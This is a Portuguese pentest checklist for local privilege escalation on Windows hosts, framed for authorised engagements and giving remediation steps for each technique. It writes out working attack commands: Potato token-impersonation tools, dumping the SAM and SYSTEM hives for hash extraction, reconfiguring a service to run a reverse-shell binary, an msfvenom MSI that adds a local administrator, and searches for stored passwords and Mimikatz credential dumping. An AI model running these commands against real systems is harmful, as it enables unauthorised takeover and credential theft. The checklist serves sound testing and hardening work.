# Privilege Escalation Local — Windows

> Checklist de bolso para escalonamento de privilégios em hosts Windows durante engajamentos autorizados.

## Uso autorizado

Use apenas em sistemas dentro do escopo, com autorização formal. WinPEAS e PoCs disparam Defender/EDR e geram eventos — coordene com a equipe defensiva (blue team) quando exigido pelas Rules of Engagement e registre todas as ações para a trilha de auditoria.

---

## 0. Triagem inicial

```cmd
whoami /all                      :: usuário, grupos, PRIVILÉGIOS, integrity level
whoami /priv                     :: foco em privilégios habilitados
systeminfo                       :: build, hotfixes (cruzar com exploits)
hostname & echo %USERNAME%
net user %USERNAME%
net localgroup administrators
```
```powershell
[Environment]::OSVersion ; (Get-CimInstance Win32_OperatingSystem).Caption
Get-HotFix | Sort-Object InstalledOn -Descending | Select -First 15
```

Grupos/privilégios de alto valor: `Administrators`, `Backup Operators`, `Server Operators`, `DnsAdmins`; privilégios `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeDebugPrivilege`, `SeLoadDriverPrivilege`, `SeTakeOwnershipPrivilege`.

---

## 1. Tokens & privilégios (Potato family)

- [ ] `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege` habilitado (comum em contas de serviço: IIS `iis apppool\...`, MSSQL `nt service\...`).
- [ ] `SeBackupPrivilege` / `SeRestorePrivilege` → ler SAM/SYSTEM ou sobrescrever arquivos protegidos.
- [ ] `SeDebugPrivilege` → injetar/abrir processos privilegiados.
- [ ] `SeTakeOwnershipPrivilege` → assumir posse de objetos.
- [ ] `SeLoadDriverPrivilege` → carregar driver malicioso.

```cmd
whoami /priv
:: SeImpersonate → Potatoes (escolha conforme versão/OS):
PrintSpoofer.exe -i -c cmd.exe
GodPotato -cmd "cmd /c whoami"
JuicyPotatoNG.exe -t * -p cmd.exe
```
```cmd
:: SeBackupPrivilege → dump de hives para extrair hashes:
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
:: depois: secretsdump.py -sam sam.hive -system system.hive LOCAL
```

**Remediação:** minimize contas com `SeImpersonate`/`SeAssignPrimaryToken`; isole contas de serviço; mantenha o SO com patches (mitigações de RPC/DCOM); use gMSA com privilégios reduzidos.

---

## 2. Serviços

### 2a. Permissões fracas no serviço (reconfigurar binPath)
- [ ] Serviço cujo usuário atual pode alterar config (`SERVICE_CHANGE_CONFIG`).
- [ ] Serviço com `WRITE_DAC`/`WRITE_OWNER`.

```cmd
:: enumerar e checar ACL com accesschk (Sysinternals):
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% *
sc qc <servico>
:: se reconfigurável:
sc config <servico> binPath= "C:\temp\rev.exe"
sc stop <servico> & sc start <servico>
```

### 2b. Binário do serviço gravável (replace)
- [ ] Permissão de escrita no executável do serviço que roda como SYSTEM.

```cmd
accesschk.exe -quvw "C:\Path\service.exe"
icacls "C:\Path\service.exe"
```

### 2c. Unquoted service paths
- [ ] Caminho com espaços e sem aspas + diretório gravável no caminho.

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""
:: ex.: C:\Program Files\Some Dir\service.exe → tentar C:\Program.exe ou C:\Program Files\Some.exe
icacls "C:\Program Files\Some Dir"
```

**Remediação:** ACLs restritas em serviços e binários (somente Admin escreve); sempre cite caminhos entre aspas no registro (`ImagePath`); rode serviços com a conta de menor privilégio.

---

## 3. Tarefas agendadas (Scheduled Tasks)

- [ ] Tarefas rodando como SYSTEM/Admin que executam binário/script gravável.
- [ ] Tarefa com PATH/argumento controlável.

```cmd
schtasks /query /fo LIST /v
```
```powershell
Get-ScheduledTask | ForEach-Object {
  $a = $_.Actions.Execute
  if ($a) { [PSCustomObject]@{Task=$_.TaskName; Exe=$a; User=$_.Principal.UserId} }
} | Where-Object {$_.User -match 'SYSTEM|Admin'}
icacls "C:\path\do\binario_da_tarefa.exe"
```

**Remediação:** restrinja escrita nos alvos das tarefas; execute com a menor conta possível; valide a integridade dos scripts agendados.

---

## 4. AlwaysInstallElevated

- [ ] Ambas as chaves (HKCU e HKLM) com valor `1` → instalar MSI como SYSTEM.

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: se ambas = 0x1, instalar MSI (PoC com msfvenom em lab):
:: msfvenom -p windows/x64/exec CMD='net localgroup administrators user /add' -f msi -o evil.msi
msiexec /quiet /qn /i C:\temp\evil.msi
```

**Remediação:** desabilite a política `AlwaysInstallElevated` (GPO: Computer e User Configuration → Administrative Templates → Windows Installer → "Always install with elevated privileges" = Disabled).

---

## 5. Registro & DLL hijacking

- [ ] Chaves `Run`/`Services` graváveis.
- [ ] `ImagePath` de serviço editável.
- [ ] DLLs ausentes carregadas por processos privilegiados em diretórios graváveis (DLL search order / phantom DLL).

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Services\<svc> /v ImagePath
accesschk.exe -kvuqsw hklm\System\CurrentControlSet\Services
:: PATH dirs graváveis (DLL hijack):
accesschk.exe -uwdq "C:\Program Files\App\"
```

**Remediação:** ACLs restritas nas chaves de serviço; instale apps em diretórios protegidos; defina caminhos completos de DLL e use SafeDllSearchMode.

---

## 6. Credenciais armazenadas

```cmd
:: arquivos de unattended/sysprep:
dir /s /b C:\unattend.xml C:\sysprep.inf C:\Windows\Panther\Unattend.xml 2>nul
:: credenciais salvas:
cmdkey /list
:: registro (autologon, VNC, PuTTY):
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
:: busca genérica:
findstr /si password *.txt *.ini *.config *.xml 2>nul
```
```powershell
:: histórico do PowerShell:
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
:: DPAPI / credential manager → vault::cred (Mimikatz em lab autorizado)
```

**Remediação:** remova arquivos de unattended com senhas; use LAPS para senhas de Admin local; não armazene segredos em scripts/registro; rotacione credenciais expostas.

---

## 7. Kernel / patch level

- [ ] Cruzar build + hotfixes com exploits conhecidos (use como último recurso e com autorização).

```cmd
systeminfo
:: Watson / WES-NG (offline):
:: wes.py systeminfo.txt
```
Exemplos históricos para identificação: PrintNightmare (CVE-2021-34527), HiveNightmare/SeriousSAM (CVE-2021-36934), CVE-2022-21882 (Win32k), CVE-2023-21768.

```cmd
:: HiveNightmare — verificar ACL leitura da SAM em VSS:
icacls C:\Windows\System32\config\SAM
```

**Remediação:** mantenha Windows Update em dia; aplique mitigações específicas (desabilitar Spooler onde não necessário); monitore via EDR.

---

## 8. Ferramentas de enumeração

```cmd
:: WinPEAS (escolha o build conforme o ambiente):
winPEASx64.exe
winPEASany.exe quiet cmd fast
:: PowerUp (PowerShell):
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
:: SharpUp:
SharpUp.exe audit
:: Seatbelt (coleta ampla):
Seatbelt.exe -group=all
:: accesschk (Sysinternals) — ACLs:
accesschk.exe -accepteula -uwcqv "Authenticated Users" *
```

> Leitura do WinPEAS: itens em VERMELHO indicam alta probabilidade de vetor. Sempre confirme manualmente (ex.: `accesschk`, `icacls`, `sc qc`) antes de explorar.

---

## 9. Referências rápidas

- LOLBAS — https://lolbas-project.github.io
- PEASS-ng (WinPEAS) — https://github.com/peass-ng/PEASS-ng
- PowerSploit / PowerUp; GhostPack (SharpUp, Seatbelt)
- HackTricks — Windows Local Privilege Escalation
